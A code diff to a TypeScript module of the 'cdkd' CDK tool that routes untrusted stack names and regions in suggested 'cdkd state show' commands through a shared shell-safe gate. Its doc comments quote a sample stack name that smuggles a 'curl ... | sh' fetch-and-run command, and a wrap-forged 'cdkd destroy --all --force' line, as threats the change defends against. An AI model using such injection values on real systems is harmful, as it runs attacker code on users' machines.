@@ -9,6 +9,7 @@ import {
   isPasteableIdent,
   truncateCodePoints,
 } from '../utils/display-safe.js';
+import { pasteableCommand } from '../utils/pasteable-command.js';
 import {
   commandHole,
   recoveryCommandFlags,
@@ -91,33 +92,45 @@ export { isReadableBag };
  * A logical id does NOT share it: CloudFormation allows 255 characters there
  * (`IDENT_MAX_CODE_POINTS`), and a legitimate 129-to-255-character CDK id cut at
  * 128 renders as a name the record does not hold.
+ *
+ * It is the cap a REGION is DISPLAYED at in this module (`safeRegion`), and
+ * therefore the cap the two `--stack-region` values that sit beside such a
+ * display are GATED at: {@link inspectCommand} and `cli/commands/export.ts`'s
+ * drift-gap report (which is why it is exported) pass it to the shared gate as
+ * `maxCodePoints`, rather than the gate's stack-name default. `gc.ts`, which
+ * displays the whole S3 key rather than a region, keeps that default.
  */
-const SHORT_NAME_MAX_CODE_POINTS = 128;
+export const SHORT_NAME_MAX_CODE_POINTS = 128;
 
 /**
  * The shared explanation, in the terms the reader needs: what is wrong, what
  * to look at, and what NOT to do next.
  *
- * Both identifiers are SANITIZED and THEN SHELL-QUOTED, and the command is
+ * Both identifiers are SANITIZED for the PROSE, and the command beside them is
  * emitted LAST and UNWRAPPED — the shape `lock-contention-message.ts` and
  * `.claude/rules/layout-state-types.md` require of any suggestion a user is
- * meant to paste, for two separate reasons.
+ * meant to paste. Inside the command the RAW values go through the shared
+ * gate ({@link inspectCommand}): named shell-quoted only when exact and plain,
+ * a quoted hole otherwise. Two reasons that is not "sanitized, then quoted":
  *
  * Sanitizing alone is not enough. `displaySafe(..., { asciiOnly: true })` is a
  * printable-ASCII allowlist, so it removes the line- and escape-forgery class
  * but KEEPS `'`, `;`, `|`, `` ` ``, `$` and spaces — and neither name is
  * trusted here, since a stack name reaches the cross-stack read path from an
  * `Fn::GetStackOutput` argument or an S3 key. A name spelled
- * `a'; curl http://x|sh; echo '` would close the quoting and append its own
- * command to the line this text tells the user to RUN.
+ * `a'; curl http://x|sh; echo '` sanitizes to itself; unquoted it would close
+ * the quoting and append its own command to the line this text tells the user
+ * to RUN, and quoted its spelling is what an operator strips — which is why
+ * the gate holes it rather than quoting it.
  *
  * Wrapping the command in `'...'` is not enough either, and is what makes the
  * two compose badly: `shellQuote` does its own quoting, so an outer wrapper
  * produces something unpastable. Hence unwrapped and last.
  *
- * An identifier that sanitizes to EMPTY becomes `UNRENDERABLE` rather than
- * nothing — an empty argument makes `--stack-region` swallow the next flag,
- * turning a remedy into a differently-broken command.
+ * An identifier that sanitizes to EMPTY becomes `UNRENDERABLE` in the prose
+ * rather than nothing, so the sentence names a damaged identity rather than
+ * none; in the command the gate prints a hole for it, since an empty argument
+ * makes `--stack-region` swallow the next flag.
  *
  * MODULE-PRIVATE, and it stayed that way after go-to-k/cdkd#3206's review
  * considered exporting it. `cdkd scrub`'s audited-record refusal needed the
@@ -134,13 +147,15 @@ const SHORT_NAME_MAX_CODE_POINTS = 128;
  * difference is what the command DOES: `cdkd force-unlock` deletes another
  * process's lock, so naming a stack that is not quite the record's is
  * destructive and suppressing is right. The command most texts here end on is
- * `cdkd state show`, which reads; emitting it with a sanitized name leads the
- * reader either to "no state found for ..." or to a sibling record the name
- * now matches, which a read shows them as healthy. Neither changes anything,
- * where emitting NOTHING leaves a broken record with no next step at all. A
- * text that points at a command which WRITES owns the gate at its own site:
- * {@link malformedDestroyResourcesRefusalMessage} names no target unless both
- * identifiers render exactly, and gives `cdkd state orphan` as a template.
+ * `cdkd state show`, which reads, and since go-to-k/cdkd#3436's fold-in
+ * {@link inspectCommand} builds it through the shared `pasteableCommand`
+ * gate: a name sanitizing would change prints as a quoted HOLE, never as its
+ * sanitized spelling (which could select a sibling record the altered name
+ * happens to match) and never as nothing (which leaves a broken record with no
+ * next step at all). A text that points at a command which WRITES owns the
+ * gate at its own site: {@link malformedDestroyResourcesRefusalMessage} names
+ * no target unless both identifiers render exactly, and gives
+ * `cdkd state orphan` as a template.
  */
 function safeIdentifier(value: string, maxCodePoints: number): string {
   // CAPPED as well as sanitized. A stack name can arrive from an S3 key, so a
@@ -585,7 +600,9 @@ function mayNameTargetWithDestructiveRemedy(stackName: string, region: string): 
  * still a bound: a planted multi-kilobyte name is truncated at 1152 and lands
  * in the withhold arm.
  *
- * Identifiers are sanitized and THEN shell-quoted, for the reasons
+ * Identifiers are sanitized in the PROSE and, where a command names one,
+ * gated and shell-quoted ({@link inspectCommand}, behind
+ * {@link mayNameTargetWithDestructiveRemedy}), for the reasons
  * {@link safeIdentifier}'s note gives.
  */
 export function malformedDestroyResourcesRefusalMessage(stackName: string, region: string): string {
@@ -893,8 +910,10 @@ export function refuseDivergentRecordRegionForDestroy(
  * plausible `--dry-run` plan followed by a refusal the moment the flag comes
  * off would be the worst arm of all.
  *
- * Identifiers are sanitized and THEN shell-quoted and the command is emitted
- * LAST, for the reasons {@link safeIdentifier}'s note gives.
+ * Identifiers are sanitized in the PROSE and gated in the command — named
+ * shell-quoted only when the shared gate admits them, a quoted hole otherwise
+ * ({@link inspectCommand}) — and the command is emitted LAST, for the reasons
+ * {@link safeIdentifier}'s note gives.
  */
 export function malformedDeployResourcesRefusalMessage(
   rawStackName: string,
@@ -1006,9 +1025,10 @@ export type RenderedStateContainer = 'outputs' | 'skippedOutputs' | 'attributes'
  * stable across records. Not `.sort()` — that order is deliberately not
  * alphabetical, and its own JSDoc says so.
  *
- * Both identifiers are sanitized and then shell-quoted, and the command is
- * emitted LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s own note
- * gives.
+ * Both identifiers are sanitized in the PROSE and gated in the command —
+ * named shell-quoted only when the shared gate admits them, a quoted hole
+ * otherwise ({@link inspectCommand}) — and the command is emitted LAST and
+ * UNWRAPPED, for the reasons {@link safeIdentifier}'s own note gives.
  *
  * The container NAMES take {@link safeIdentifier} too — the SAME helper, so
  * they cannot drift from it — but NOT `shellQuote`, because they appear in the
@@ -1182,8 +1202,10 @@ export function repairMalformedOutputsForReadOnly(state: StackState): boolean {
  * operator who reads `ADD` rows for outputs the stack already has needs to know
  * the comparison lost its left-hand side.
  *
- * Identifiers are sanitized and then shell-quoted and the command is emitted
- * LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s note gives.
+ * Identifiers are sanitized in the PROSE and GATED in the command — named
+ * shell-quoted only when the shared gate admits them, a quoted hole otherwise
+ * ({@link inspectCommand}) — and the command is emitted LAST and UNWRAPPED,
+ * for the reasons {@link safeIdentifier}'s note gives.
  */
 export function malformedOutputsWarning(rawStackName: string, rawRegion: string): string {
   // {@link absentIfEmpty} at the boundary, then the shared clause and command.
@@ -1265,8 +1287,10 @@ export function refuseMalformedState(
  * bag published one fabricated export per character into the namespace every
  * other stack's `Fn::ImportValue` binds against.
  *
- * Identifiers are sanitized and THEN shell-quoted and the command is emitted
- * LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s note gives.
+ * Identifiers are sanitized in the PROSE and GATED in the command — named
+ * shell-quoted only when the shared gate admits them, a quoted hole otherwise
+ * ({@link inspectCommand}) — and the command is emitted LAST and UNWRAPPED,
+ * for the reasons {@link safeIdentifier}'s note gives.
  */
 export function malformedOutputsRefusalMessage(
   rawStackName: string,
@@ -1310,8 +1334,10 @@ export function malformedOutputsRefusalMessage(
  * other producer in the region down with it, and the index is best-effort by
  * design.
  *
- * Identifiers are sanitized and THEN shell-quoted and the command is emitted
- * LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s note gives.
+ * Identifiers are sanitized in the PROSE and GATED in the command — named
+ * shell-quoted only when the shared gate admits them, a quoted hole otherwise
+ * ({@link inspectCommand}) — and the command is emitted LAST and UNWRAPPED,
+ * for the reasons {@link safeIdentifier}'s note gives.
  */
 export function malformedExportSourceWarning(rawStackName: string, rawRegion: string): string {
   // {@link absentIfEmpty} at the boundary, then the shared clause and command.
@@ -1350,8 +1376,10 @@ export function malformedExportSourceWarning(rawStackName: string, rawRegion: st
  * makes the preview report no key as an export, so a row that would carry
  * `[export]` renders without it.
  *
- * Identifiers are sanitized and THEN shell-quoted and the command is emitted
- * LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s note gives.
+ * Identifiers are sanitized in the PROSE and GATED in the command — named
+ * shell-quoted only when the shared gate admits them, a quoted hole otherwise
+ * ({@link inspectCommand}) — and the command is emitted LAST and UNWRAPPED,
+ * for the reasons {@link safeIdentifier}'s note gives.
  */
 export function malformedExportNamesWarning(rawStackName: string, rawRegion: string): string {
   // {@link absentIfEmpty} at the boundary, then the shared clause and command.
@@ -1494,8 +1522,10 @@ export function repairMalformedOrphansForReadOnly(state: StackState): boolean {
  * sees no adoption preview and no orphan warning will conclude the stack has
  * none.
  *
- * Identifiers are sanitized and THEN shell-quoted and the command is emitted
- * LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s note gives.
+ * Identifiers are sanitized in the PROSE and GATED in the command — named
+ * shell-quoted only when the shared gate admits them, a quoted hole otherwise
+ * ({@link inspectCommand}) — and the command is emitted LAST and UNWRAPPED,
+ * for the reasons {@link safeIdentifier}'s note gives.
  */
 export function malformedOrphansWarning(rawStackName: string, rawRegion: string): string {
   // {@link absentIfEmpty} at the boundary, then the shared clause and command.
@@ -1525,8 +1555,10 @@ export function malformedOrphansWarning(rawStackName: string, rawRegion: string)
  * resource deletion to `deleteState` having never reported the orphans it could
  * not read.
  *
- * Identifiers are sanitized and THEN shell-quoted and the command is emitted
- * LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s note gives.
+ * Identifiers are sanitized in the PROSE and GATED in the command — named
+ * shell-quoted only when the shared gate admits them, a quoted hole otherwise
+ * ({@link inspectCommand}) — and the command is emitted LAST and UNWRAPPED,
+ * for the reasons {@link safeIdentifier}'s note gives.
  */
 export function malformedOrphansRefusalMessage(rawStackName: string, rawRegion: string): string {
   // {@link absentIfEmpty} at the boundary, then the shared clause and command.
@@ -1676,8 +1708,10 @@ export function refuseMalformedOrphans(
  * Reading the bag as empty (the read-only repair) IS that second answer, so
  * the only answer that fabricates nothing and skips no protection is to stop.
  *
- * Identifiers are sanitized and THEN shell-quoted and the command is emitted
- * LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s note gives.
+ * Identifiers are sanitized in the PROSE and GATED in the command — named
+ * shell-quoted only when the shared gate admits them, a quoted hole otherwise
+ * ({@link inspectCommand}) — and the command is emitted LAST and UNWRAPPED,
+ * for the reasons {@link safeIdentifier}'s note gives.
  */
 export function malformedDestroyOutputsRefusalMessage(
   rawStackName: string,
@@ -1747,8 +1781,10 @@ export function refuseMalformedOutputsForDestroy(
  * six-key map ... republished into the shared exports index" would name the
  * wrong record and the wrong blast radius.
  *
- * Identifiers are sanitized and THEN shell-quoted and the command is emitted
- * LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s note gives.
+ * Identifiers are sanitized in the PROSE and GATED in the command — named
+ * shell-quoted only when the shared gate admits them, a quoted hole otherwise
+ * ({@link inspectCommand}) — and the command is emitted LAST and UNWRAPPED,
+ * for the reasons {@link safeIdentifier}'s note gives.
  */
 export function malformedNestedChildOutputsRefusalMessage(
   rawChildStackName: string,
@@ -1826,8 +1862,10 @@ export function refuseMalformedNestedChildOutputs(
  * `hasReadableExportSet` / {@link malformedExportSourceWarning}, so nothing
  * here can launder a record.
  *
- * Identifiers are sanitized and THEN shell-quoted and the command is emitted
- * LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s note gives.
+ * Identifiers are sanitized in the PROSE and GATED in the command — named
+ * shell-quoted only when the shared gate admits them, a quoted hole otherwise
+ * ({@link inspectCommand}) — and the command is emitted LAST and UNWRAPPED,
+ * for the reasons {@link safeIdentifier}'s note gives.
  */
 export function malformedLocalOutputsWarning(rawStackName: string, rawRegion: string): string {
   // {@link absentIfEmpty} at the boundary, then the shared clause and command.
@@ -2001,7 +2039,9 @@ function dropRecordCommand(
  * `cdkd state show` line ({@link orphanInspectCommand}) and the object path
  * ({@link orphanInspectClause}) — so no two of them can disagree about a name
  * (go-to-k/cdkd#3363 review, M0 and M2). The shared {@link inspectCommand}
- * stays ungated for its other callers, which offer a read only.
+ * builds through the shared gate for its other callers, which offer a read
+ * only: an altered, capped, empty, option-shaped or non-plain name is a quoted
+ * hole there, never a sanitized spelling.
  *
  * It is NOT the module's gate for a DESTRUCTIVE remedy and must not be unified
  * with one: the three messages that offer a hole TEMPLATE are all stricter,
@@ -2039,8 +2079,45 @@ function inspectCommand(stackName: string | undefined, region: string | undefine
     // here would be substituting the untrusted values the clause above drops.
     return `cdkd state show ${commandHole('stack')} --stack-region ${commandHole('region')} --json`;
   }
-  const flag = region === undefined ? '' : ` --stack-region ${shellQuote(safeRegion(region))}`;
-  return `cdkd state show ${shellQuote(safeStackName(stackName))}${flag} --json`;
+  // The SHARED gate since go-to-k/cdkd#3436's fold-in. The local form printed
+  // `shellQuote(safeStackName(...))` -- the SANITIZED spelling, ungated -- so a
+  // name rendering ALTERED was named rather than withheld, and the command then
+  // addressed a different record than the message meant. The rule
+  // `.claude/rules/state-malformed-containers.md` states for this arm is that
+  // nothing here SUBSTITUTES a sanitized spelling: a value the gate refuses
+  // prints as a HOLE rather than as a different name. The arm above is the
+  // one deliberate TEMPLATE, taken when the caller had no name to gate — the
+  // destroy refusals hand it an inexact identity that way.
+  //
+  // BOTH values are held to `plainIdent`: this command sits beside a labelled
+  // line, the shape that rule governs, and exactness alone admits a name with
+  // interior padding that spells a labelled line once the terminal wraps
+  // (`Prod<60 spaces>Migrate with: cdkd destroy --all --force #`) — the
+  // wrap-forge the option exists for (M2 of the go-to-k/cdkd#3764 review).
+  // Real CDK names, `Parent~Child` included, pass `isPasteableIdent`.
+  //
+  // The region keeps ITS cap: this message displays it through `safeRegion`
+  // at `SHORT_NAME_MAX_CODE_POINTS`, and a gate at the stack-name cap names a
+  // 200-character region in full under a clause that renders it cut — the
+  // exact "borrowing a gate UPWARD" the rule file forbids. `maxCodePoints` is
+  // how the gate takes a caller's cap without the caller re-spelling the
+  // comparison.
+  return `${
+    pasteableCommand(
+      'cdkd state show',
+      region === undefined
+        ? [{ value: stackName, hole: 'stack', opts: { plainIdent: true } }]
+        : [
+            { value: stackName, hole: 'stack', opts: { plainIdent: true } },
+            {
+              flag: '--stack-region',
+              value: region,
+              hole: 'region',
+              opts: { plainIdent: true, maxCodePoints: SHORT_NAME_MAX_CODE_POINTS },
+            },
+          ]
+    ).command
+  } --json`;
 }
 
 /**
